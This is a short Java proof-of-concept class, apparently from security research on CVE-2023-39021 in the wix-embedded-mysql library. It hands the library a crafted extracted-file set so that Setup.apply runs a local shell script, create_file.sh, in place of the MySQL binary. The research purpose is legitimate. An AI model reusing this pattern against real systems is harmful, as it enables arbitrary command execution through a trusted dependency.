package com.anonuser;

import java.io.File;
import java.io.IOException;
import java.util.Collections;
import java.util.List;

import com.wix.mysql.config.MysqldConfig;
import com.wix.mysql.distribution.Setup;
import com.wix.mysql.distribution.Version;

import de.flapdoodle.embed.process.config.store.FileType;
import de.flapdoodle.embed.process.extract.IExtractedFileSet;

public class Wix_CVE_2023_39021 {

    public static void main(String[] args) {
        IExtractedFileSet set = new IExtractedFileSet() {
            @Override
            public File executable() {
                return new File("/home/pamusuo/research/permissions-manager/exploit-apps/files/create_file.sh");
            }

            @Override
            public List<File> files(FileType fileType) {
                return Collections.singletonList(new File("/home/pamusuo/research/permissions-manager/exploit-apps/files/create_file.sh"));
            }

            @Override
            public File baseDir() {
                return null;
            }

            @Override
            public boolean baseDirIsGenerated() {
                return false;
            }
        };
        MysqldConfig.Builder builder = MysqldConfig.aMysqldConfig(Version.v5_7_10);
        try {
            Setup.apply(builder.build(), set, null);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
